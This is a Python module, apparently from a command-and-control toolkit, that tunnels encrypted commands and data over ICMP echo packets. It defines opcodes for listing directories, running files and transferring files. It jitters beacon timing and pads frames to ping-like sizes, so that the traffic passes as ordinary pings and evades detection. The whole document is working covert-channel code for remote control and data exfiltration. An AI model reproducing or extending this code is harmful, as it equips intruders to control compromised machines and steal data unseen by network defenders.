#!/usr/bin/env python3

# *********************************************************
#
# Description: Custom ICMP layer framing, ChaCha20 stream encryption,
#              HMAC-SHA256 integrity, and payload chunking.
# Author: Moshe Yifrah
#
# *********************************************************

# --- Modules ---

from __future__ import annotations

import argparse
import hashlib
import hmac
import ipaddress
import math
import os
import random
import struct
import time
from typing import Final, List, Optional, Tuple
import scapy.all as scapy
from scapy.layers.inet import ICMP, IP
from scapy.packet import Raw
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms

from . import cnc_crypto

# --- System Constants ---

TTL_VAL: Final[int] = 64
ICMP_ECHO_REQUEST_TYPE: Final[int] = 8
ICMP_ECHO_REPLY_TYPE: Final[int] = 0

OPCODE_CMD: Final[int] = 0x01
OPCODE_RES: Final[int] = 0x02
OPCODE_ACK: Final[int] = 0x03
OPCODE_RESET: Final[int] = 0x04
OPCODE_SHUTDOWN: Final[int] = 0x05

CMD_KEEPALIVE: Final[int] = 0x00
CMD_LIST_DIR: Final[int] = 0x11
CMD_RUN_FILE: Final[int] = 0x22
CMD_FILE_TRANSFER: Final[int] = 0x33

FLAG_NONE: Final[int] = 0x00
FLAG_EOF: Final[int] = 0x01

HEADER_STRUCT: Final[struct.Struct] = struct.Struct("!BBBBIIH16s")
IP_OVERHEAD: Final[int] = 20
ICMP_OVERHEAD: Final[int] = 8
FIXED_OVERHEAD: Final[int] = IP_OVERHEAD + ICMP_OVERHEAD + HEADER_STRUCT.size

MIN_PAYLOAD: Final[int] = 8
MAX_PACKET_SIZE: Final[int] = 1472
MAX_BUFFER_LIMIT: Final[int] = 10 * 1024 * 1024
DEFAULT_PACKET_SIZE: Final[int] = 64

MAX_RETRANSMIT_ATTEMPTS: Final[int] = 5
DEFAULT_BASE_TIMEOUT: Final[float] = 0.25
MAX_TIMEOUT_VAL: Final[float] = 5.0
NETWORK_MULTIPLIER: Final[float] = 2.5
EXPONENTIAL_BACKOFF_FACTOR: Final[float] = 1.5
DISPATCHER_TIMEOUT: Final[float] = 1.0

_heartbeat_interval: float = 10.0
_LOGNORMAL_SIGMA: float = 0.35        # ~35 % coefficient of variation
_LOGNORMAL_MIN: float = 1.0           # floor so beacons never pile up
_icmp_id: int = os.getpid() & 0xFFFF
_icmp_seq_counter: int = random.getrandbits(16)
max_data_size: int = DEFAULT_PACKET_SIZE - FIXED_OVERHEAD

_measured_rtt: float = 0.15
_tx_start_time: Optional[float] = None
_transfer_id_counter: int = random.getrandbits(32)

# ==============================================================================

# --- Functions ---

def get_psk() -> bytes:
    """Retrieve the active session key from the cryptographic module."""
    return cnc_crypto.get_session_psk()

# ==============================================================================

def get_next_transfer_id() -> int:
    """Increment and return a unique 32-bit transfer ID."""
    global _transfer_id_counter
    _transfer_id_counter = (_transfer_id_counter + 1) & 0xFFFFFFFF
    if _transfer_id_counter == 0:
        _transfer_id_counter = 1
    return _transfer_id_counter

# ==============================================================================

def update_dynamic_packet_size(total_packet_size: int) -> None:
    """Calculate and set the maximum chunk data size from total packet limit."""
    global max_data_size
    clamped_size = min(
        MAX_PACKET_SIZE,
        max(FIXED_OVERHEAD + MIN_PAYLOAD, total_packet_size),
    )
    max_data_size = clamped_size - FIXED_OVERHEAD

# ==============================================================================

def get_heartbeat_interval() -> float:
    """Return a log-normal jittered interval with the configured mean as median.

    Log-normal is right-skewed: most intervals cluster near the median while
    occasional longer gaps mimic real user-driven ICMP traffic patterns.
    """
    mu = math.log(_heartbeat_interval) - (_LOGNORMAL_SIGMA ** 2) / 2
    return max(_LOGNORMAL_MIN, random.lognormvariate(mu, _LOGNORMAL_SIGMA))


def get_icmp_id() -> int:
    """Return the process-stable ICMP identifier (mirrors real ping behaviour)."""
    return _icmp_id


def get_next_icmp_seq() -> int:
    """Return the next ICMP sequence number, wrapping at 65535."""
    global _icmp_seq_counter
    _icmp_seq_counter = (_icmp_seq_counter + 1) & 0xFFFF
    return _icmp_seq_counter

# ==============================================================================

def start_rtt_timer(is_retransmit: bool = False) -> None:
    """Record transmission start timestamp for non-retransmitted packets."""
    global _tx_start_time
    _tx_start_time = None if is_retransmit else time.perf_counter()

# ==============================================================================

def update_rtt_measurement() -> None:
    """Update the smoothed RTT estimate using an exponential moving average."""
    global _measured_rtt, _tx_start_time
    if _tx_start_time is not None:
        elapsed = time.perf_counter() - _tx_start_time
        _measured_rtt = (0.8 * _measured_rtt) + (0.2 * elapsed)
        _tx_start_time = None

# ==============================================================================

def get_adaptive_timeout(retry_count: int = 0) -> float:
    """Calculate the retransmission timeout with exponential backoff."""
    base = max(DEFAULT_BASE_TIMEOUT, _measured_rtt * NETWORK_MULTIPLIER)
    return min(
        MAX_TIMEOUT_VAL, base * (EXPONENTIAL_BACKOFF_FACTOR ** retry_count)
    )

# ==============================================================================

def validate_ipv4(address: str) -> str:
    """Validate that a string represents a valid IPv4 address."""
    try:
        ip = ipaddress.ip_address(address)
        if not isinstance(ip, ipaddress.IPv4Address):
            raise argparse.ArgumentTypeError("IPv4 signature violation.")
        return str(ip)
    except ValueError as exc:
        raise argparse.ArgumentTypeError("Invalid target host layout.") from exc

# ==============================================================================

def chunk_binary_payload(data_bytes: bytes) -> List[bytes]:
    """Split a binary payload into chunks bounded by max_data_size."""
    if not data_bytes:
        return [b""]
    return [
        data_bytes[i:i + max_data_size]
        for i in range(0, len(data_bytes), max_data_size)
    ]

# ==============================================================================

def prepare_transfer_frames(
    raw_bytes_payload: bytes, net_opcode: int, app_opcode: int
) -> Tuple[int, List[Tuple[bytes, int]]]:
    """Encode a payload into ready-to-send frames for one reliable transfer.

    Returns (transfer_id, [(frame_bytes, seq_id), ...]) so callers only need
    to loop and feed each frame into their ARQ send mechanism.
    """
    chunks = chunk_binary_payload(raw_bytes_payload)
    total = len(chunks)
    psk = get_psk()
    transfer_id = get_next_transfer_id()
    frames = [
        (
            encode_frame(
                chunk, net_opcode, app_opcode,
                transfer_id, i + 1, i == total - 1, psk,
            ),
            i + 1,
        )
        for i, chunk in enumerate(chunks)
    ]
    return transfer_id, frames

# ==============================================================================

def serialize_header_fields(
    net_op: int, app_op: int, flags: int, reserved: int, tid: int, seq: int,
    plen: int
) -> bytes:
    """Pack frame header metadata fields into network byte order."""
    return struct.pack(
        "!BBBBIIH", net_op, app_op, flags, reserved, tid, seq, plen
    )

# ==============================================================================

def _crypt_payload(
    payload: bytes, psk: bytes, net_op: int, tid: int, seq: int
) -> bytes:
    """Encrypt or decrypt payload bytes using zero-overhead ChaCha20."""
    if not payload:
        return b""
    enc_key = hmac.new(psk, b"chacha20-enc-key", hashlib.sha256).digest()
    nonce = struct.pack("!IIII", 0, net_op, tid, seq & 0xFFFFFFFF)
    cipher = Cipher(algorithms.ChaCha20(enc_key, nonce), mode=None)
    return cipher.encryptor().update(payload)

# ==============================================================================

def _compute_frame_mac(
    psk: bytes, header_raw: bytes, ciphertext: bytes
) -> bytes:
    """Compute a 16-byte HMAC-SHA256 tag over header and ciphertext."""
    mac_key = hmac.new(psk, b"hmac-auth-key", hashlib.sha256).digest()
    return hmac.new(
        mac_key, header_raw + ciphertext, hashlib.sha256
    ).digest()[:16]

# ==============================================================================

def encode_frame(
    chunk_bytes: bytes, net_opcode: int, app_opcode: int, transfer_id: int,
    seq_id: int, is_eof: bool, psk: bytes
) -> bytes:
    """Encrypt a chunk and encapsulate it with an authenticated header."""
    flags = FLAG_EOF if is_eof else FLAG_NONE
    ciphertext = _crypt_payload(
        chunk_bytes, psk, net_opcode, transfer_id, seq_id
    )
    payload_len = len(ciphertext)
    header_raw = serialize_header_fields(
        net_opcode, app_opcode, flags, 0, transfer_id, seq_id, payload_len
    )
    mac = _compute_frame_mac(psk, header_raw, ciphertext)
    return HEADER_STRUCT.pack(
        net_opcode, app_opcode, flags, 0, transfer_id, seq_id, payload_len, mac
    ) + ciphertext

# ==============================================================================

def encode_control_frame(
    opcode: int, tid: int = 0, seq: int = 0
) -> bytes:
    """Encode an empty authenticated control frame (ACK/RESET/SHUTDOWN)."""
    return encode_frame(
        b"", opcode, CMD_KEEPALIVE, tid, seq, True, get_psk()
    )

# ==============================================================================

def decode_and_verify_frame(
    raw_payload: bytes, psk: bytes
) -> Optional[Tuple[int, int, int, int, int, bytes]]:
    """Verify frame HMAC integrity and decrypt the encapsulated chunk."""
    if len(raw_payload) < HEADER_STRUCT.size:
        return None
    net_op, app_op, flags, res, tid, seq, plen, rmac = HEADER_STRUCT.unpack(
        raw_payload[:HEADER_STRUCT.size]
    )
    expected_end = HEADER_STRUCT.size + plen
    if len(raw_payload) < expected_end:
        return None

    ciphertext = raw_payload[HEADER_STRUCT.size:expected_end]
    header_raw = serialize_header_fields(
        net_op, app_op, flags, res, tid, seq, plen
    )
    expected_mac = _compute_frame_mac(psk, header_raw, ciphertext)
    if not hmac.compare_digest(rmac, expected_mac):
        return None

    plaintext = _crypt_payload(ciphertext, psk, net_op, tid, seq)
    return net_op, app_op, flags, tid, seq, plaintext

# ==============================================================================

def pad_to_ping_size(frame_bytes: bytes) -> bytes:
    """Pad small frames with random bytes to match typical ICMP ping payload sizes.

    Frames already larger than the target range are returned unchanged.
    The receiver ignores bytes past the declared payload length, so padding
    is transparent to the protocol.
    """
    if len(frame_bytes) >= 56:
        return frame_bytes
    target = random.randint(56, 84)
    return frame_bytes + os.urandom(target - len(frame_bytes))


def strip_icmp_checksum(packet_frame: scapy.Packet) -> None:
    """Delete the ICMP checksum field so the OS kernel recalculates it."""
    if ICMP in packet_frame:
        del packet_frame[ICMP].chksum

# ==============================================================================

def build_icmp_packet(
    dst_ip: str, icmp_type: int, payload: bytes, src_ip: str = "",
    icmp_id: int = 0, icmp_seq: int = 0,
) -> scapy.Packet:
    """Construct a raw IP/ICMP packet with stripped checksum ready for send."""
    ip_layer = IP(dst=dst_ip, ttl=TTL_VAL, src=src_ip) if src_ip else IP(dst=dst_ip, ttl=TTL_VAL)
    pkt = ip_layer / ICMP(type=icmp_type, id=icmp_id, seq=icmp_seq) / Raw(load=payload)
    strip_icmp_checksum(pkt)
    return pkt

# ==============================================================================

def is_valid_icmp_packet(packet: scapy.Packet) -> bool:
    """Return True if the packet has IP, ICMP, and Raw payload layers."""
    return (
        packet.haslayer(IP)
        and packet.haslayer(ICMP)
        and packet.haslayer(Raw)
    )
